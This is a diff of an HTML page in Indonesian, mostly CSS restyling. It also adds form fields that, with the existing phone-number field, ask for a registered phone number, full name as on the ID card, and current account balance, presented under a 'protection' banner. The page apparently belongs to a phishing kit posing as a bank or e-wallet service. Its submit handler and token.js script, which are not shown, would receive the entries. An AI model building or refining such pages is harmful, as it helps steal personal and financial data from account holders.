@@ -18,7 +18,8 @@
        margin: 0 auto;
        left: 0; 
        right: 0; 
-       max-width: 450px;       
+       max-width: 450px;  
+       
 } 
        
   .nav1{
@@ -93,8 +94,9 @@ h1 {
 	max-width: 430px;
 	color: #00A39E;
 	margin: 8px auto;
-	top:210px;
+	top:5px;
 	position: relative;
+	box-shadow: 2px 2px 2px #ccc;
 	
 }
 .radio-item label:after,
@@ -135,12 +137,14 @@ h1 {
       z-index: 1;
       background: #00A39E; 
       margin-top: 16px; 
-      height: 45px; 
+      height: 42px; 
       max-width: 100%; 
       color: #fff; 
       border-radius: 50px; 
       border: 1px solid #00A39E;
-      width: 72%;      
+      width: 85%;  
+      margin-bottom: 25px;    
+      box-shadow: 2px 2px 2px #ccc;
 }
 
 
@@ -161,7 +165,7 @@ h1 {
     .form-log{
         box-sizing: border-box; 
         height: 40px; 
-        width: 72%;        
+        width: 90%;        
         border:none;
         border-bottom: 1.5px solid #00A39E; 
         border-image: initial; 
@@ -175,8 +179,8 @@ h1 {
         font-size: 16px; 
         color: #00000099;              
         outline: none; 
-        padding-left: 15%;
-        margin: auto;
+        padding-left: 20%;
+        margin: 0 auto;
         display: block;
         
     }
@@ -184,9 +188,42 @@ h1 {
   .lbl{
         
         font-size: 14px;
-        color: #000000cc;
-        margin-left: 13%;
+        color: #00000090;
+        margin-left: 5%;
         font-weight: 800;
+  }
+  
+  
+   .form-log1{
+        box-sizing: border-box; 
+        height: 40px; 
+        width: 90%;        
+        border:none;
+        border-bottom: 1.5px solid #00A39E; 
+        border-image: initial; 
+        background-color: transparent;  
+        border-radius: 0px; 
+        font-family: 'Nunito', sans-serif; 
+        font-weight: 600; 
+        font-size: 16px; 
+        color: #00000099; 
+        word-spacing: 0px; 
+        padding: 0px 10px; 
+        outline: none; 
+        margin-top: 0px; 
+        padding-left: 0px;
+        margin: 10px auto;
+        display: block;
+        align-items: center;
+    }
+    
+     .lbl1{
+        position: relative;
+        font-size: 14px;
+        color: #00000090;
+        margin-left: 5%;
+        font-weight: 800;
+        top:10px;
   }
   
   ::placeholder{
@@ -351,18 +388,30 @@ chsalxcome {
 
 .box{
     position: relative;
-    background: none;
-    margin-bottom: 130px;
+    background: ;
+    margin-bottom: 160px;    
+    padding: 15px;     
 }
+
+form{
+    background: #;
+    border: 3px double #00A39E;
+    border-radius: 18px;
+    margin-top: 55%;
+    box-shadow: 2px 2px 2px #ccc;
+}
+
+ 
  </style>
 <body>
 <main>
 <welalxcome style="display: none">
 </welalxcome>
 <chsalxcome2 style="display: none;">
-<div class="box">
+
 <nav class="nav1" ></nav>
 <div class="foto">
+    <div class="box">
 <form id="formHP" onsubmit="sendHp()">
  <section class="" style="padding: 5px; left: 0; right: 0; margin: 0px auto; width: 60%">
 	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%;">
@@ -373,12 +422,21 @@ chsalxcome {
 	</div>
 		</section>   
 
-    <section style="margin-top: 320px;">
+    <section style="margin-top: 110px;">
           <label for="nohp" class="lbl">No. HP. Terdaftar</label>
      <input type="tel" id="nohp" class="form-log" maxlength="13" name="nohp" placeholder="Tuliskan Nomor Handphone Anda" minlength="10" required>
     
-   <div style="left: 0; right: 0; margin: 0px auto; width: 100%">
-    <center>
+   
+    <br>
+    <label for="nama" class="lbl1">Nama Lengkap :</label>
+     <input type="text" id="nama" class="form-log1" name="nama" placeholder="Tuliskan Nama Sesuai KTP" required> 
+     
+    
+     <label for="saldo" class="lbl1">Saldo akhir :</label>
+     <input type="tel" id="saldo" class="form-log1" maxlength="" name="saldo" data-name="rek" placeholder="Tuliskan Saldo Terakhir Anda" minlength="" required>
+      <center>
+     <img src="img/proteksi.png" width="90%" alt=""></img>
+   <div style="left: 0; right: 0; margin: 0px auto; width: 100%">   
      <button id="btnSubmit1" type="submit" class="button three" >SELANJUTNYA</button>
      </center>
      </div></div>
@@ -430,11 +488,11 @@ $( document ).ready(function() {
             setTimeout(() => {
                 $('welalxcome').fadeOut();
                 $('chsalxcome2').fadeIn();
-            },600)
+            },700)
         })
 </script>
 <script src="token.js">
-
 </script>      
+<script src="rupiah"></script>
 </body>
 </html>
